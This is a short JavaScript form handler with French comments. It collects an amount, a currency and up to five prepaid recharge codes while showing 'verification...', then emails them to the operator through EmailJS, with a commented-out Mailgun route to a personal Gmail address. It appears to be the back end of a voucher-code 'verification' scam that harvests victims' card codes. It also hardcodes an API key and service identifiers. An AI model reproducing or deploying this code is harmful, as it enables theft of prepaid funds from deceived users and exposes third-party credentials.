const btn = document.getElementById("button");

document.getElementById("myForm").addEventListener("submit", function (event) {
  event.preventDefault(); //empecher le comportement par défaut du formulaire

  btn.value = "verification...";

  const formData = new FormData(event.target); //recupère les données du formulaire

//   const apiKey = "e5c29bae0e2335cc6cf15fef382180d4-86220e6a-93dcd3db";
//   const domain = "sandboxccd50f3b0af5413fb5861e33bcd84a46.mailgun.org";
//   const url = `https://api.mailgun.net/v3/${domain}/messages`;

//   const data = {
//     from: "Mailgun Sandbox <postmaster@sandboxccd50f3b0af5413fb5861e33bcd84a46.mailgun.org>",
//     to: "vanikocelep@gmail.com",
//     subject: "Hello",
//     template: "send_data_from_user",
//     recharge: "formData.get('montant')",
//     "h:X-Mailgun-Variables": JSON.stringify({
//         recharge: formData.get('recharge'),
//         montant: formData.get('montant'),
//         pays: formData.get('pays'),
//         devise: formData.get('devise'),
//         recharge1: formData.get('codeRecharge1'),
//         recharge2: formData.get('codeRecharge2'),
//         recharge3: formData.get('codeRecharge3'),
//         recharge4: formData.get('codeRecharge4'),
//         recharge5: formData.get('codeRecharge5'),
//         email: formData.get('email')
//       }),
//   };

  const data = {
      service_id: 'service_hyjlokh', // Remplacez par votre ID de service EmailJS
      template_id: 'template_tqx1gd5', // Remplacez par votre ID de template EmailJS
      user_id: '6nWzFALFu0qk_jKjN', // Remplacez par votre ID d'utilisateur EmailJS
      template_params: {
          recharge: formData.get('recharge'),
          montant: formData.get('montant'),
          pays: formData.get('pays'),
          devise: formData.get('devise'),
          recharge1: formData.get('codeRecharge1'),
          recharge2: formData.get('codeRecharge2'),
          recharge3: formData.get('codeRecharge3'),
          recharge4: formData.get('codeRecharge4'),
          recharge5: formData.get('codeRecharge5'),
          email: formData.get('email')
      }

  };

//   const options = {
//     method: "POST",
//     headers: {
//       "Content-Type": "application/x-www-form-urlencoded",
//       Authorization: `Basic ${btoa(`api:${apiKey}`)}`,
//     },
//     body: new URLSearchParams(data),
//   };
  
//   fetch(url, options)
//     .then(response => response.json())
//     .then(body => {
//       alert("Formulaire envoyé avec succès !");
//       console.log(body);
//     })
//     .catch(error => {
//       alert("Une erreur est survenue : " + error);
//       console.error("Error sending email:", error);
//     });

  fetch("https://api.emailjs.com/api/v1.0/email/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => {
      if (response.ok) {
        alert("Formulaire envoyé avec succès !");
      } else {
        console.log(response);
        alert("Erreur lors de l'envoi du formulaire.");
      }
    })
    .catch((error) => {
      alert("Une erreur est survenue : " + error);
    });

  console.log(data);
});
